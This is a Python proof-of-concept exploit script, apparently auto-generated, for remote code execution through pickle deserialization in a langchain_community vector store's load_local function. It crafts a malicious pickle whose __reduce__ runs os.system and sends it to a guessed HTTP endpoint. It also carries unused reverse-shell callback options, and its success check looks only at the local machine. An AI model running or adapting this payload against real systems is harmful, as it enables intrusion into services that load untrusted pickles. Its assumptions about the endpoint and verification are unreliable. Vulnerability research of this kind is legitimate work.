#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-016
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_9.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for RCE in langchain-community-only's load_local function.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file path constructed from user-controlled folder_path.
The allow_dangerous_deserialization flag is checked but only prevents execution
when False. When True, it blindly loads a pickle file from the attacker-controlled
path, allowing arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command
2. Hosting it at a controlled path
3. Triggering load_local with the malicious path

Usage:
    python poc.py [--target http://victim:port] [--callback-ip IP] [--callback-port PORT]
"""

import argparse
import os
import pickle
import subprocess
import sys
import tempfile
import time

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_TARGET = "http://localhost:8000"
DEFAULT_CALLBACK_IP = "127.0.0.1"
DEFAULT_CALLBACK_PORT = 4444

# ---------------------------------------------------------------------------
# Malicious pickle payload generator
# ---------------------------------------------------------------------------
class MaliciousPickle:
    """A class whose __reduce__ method executes a command when unpickled."""
    def __reduce__(self):
        # Benign command: create a marker file to prove code execution
        cmd = "touch /tmp/poc_success.txt"
        return (os.system, (cmd,))

def create_malicious_pickle(output_path: str) -> None:
    """Create a pickle file that executes a benign command when loaded."""
    payload = MaliciousPickle()
    with open(output_path, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file at: {output_path}")

# ---------------------------------------------------------------------------
# Exploit trigger
# ---------------------------------------------------------------------------
def trigger_exploit(target_url: str, malicious_pickle_path: str) -> None:
    """
    Trigger the vulnerable load_local function by sending a crafted request.
    
    The attacker controls folder_path, which is used to construct the path
    to 'index.pkl'. We point it to our malicious pickle file.
    """
    import requests
    
    # The vulnerable endpoint expects a POST with folder_path parameter
    # Adjust the endpoint path based on the actual application wrapping
    endpoint = f"{target_url}/api/v1/trigger"
    
    # The folder_path should point to a directory containing our malicious index.pkl
    # We'll use a directory we control
    payload = {
        "folder_path": malicious_pickle_path,
        "allow_dangerous_deserialization": True
    }
    
    print(f"[*] Sending exploit to {endpoint}")
    print(f"[*] Payload: {payload}")
    
    try:
        response = requests.post(endpoint, json=payload, timeout=10)
        print(f"[+] Response status: {response.status_code}")
        print(f"[+] Response body: {response.text[:500]}")
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Unexpected error: {e}")
        sys.exit(1)

# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="PoC for RCE in langchain-community-only load_local"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--callback-ip",
        default=DEFAULT_CALLBACK_IP,
        help="IP for reverse shell (not used in benign mode)"
    )
    parser.add_argument(
        "--callback-port",
        type=int,
        default=DEFAULT_CALLBACK_PORT,
        help="Port for reverse shell (not used in benign mode)"
    )
    args = parser.parse_args()
    
    print("[*] LangChain Community RCE PoC")
    print("[*] ===========================")
    
    # Create a temporary directory to host our malicious pickle
    with tempfile.TemporaryDirectory() as tmpdir:
        # The vulnerable code looks for 'index.pkl' in the folder_path
        malicious_pickle_path = os.path.join(tmpdir, "index.pkl")
        create_malicious_pickle(malicious_pickle_path)
        
        # Verify the pickle file exists
        if not os.path.exists(malicious_pickle_path):
            print("[-] Failed to create malicious pickle file")
            sys.exit(1)
        
        print(f"[*] Malicious pickle size: {os.path.getsize(malicious_pickle_path)} bytes")
        
        # Trigger the exploit
        trigger_exploit(args.target, tmpdir)
        
        # Check if the command executed (marker file created)
        time.sleep(1)  # Give time for command to execute
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! Marker file /tmp/poc_success.txt created.")
            print("[+] The vulnerability is confirmed exploitable.")
        else:
            print("[?] Could not verify command execution on local system.")
            print("[?] Check the target system for /tmp/poc_success.txt")
        
        # Cleanup
        if os.path.exists("/tmp/poc_success.txt"):
            os.remove("/tmp/poc_success.txt")

if __name__ == "__main__":
    main()
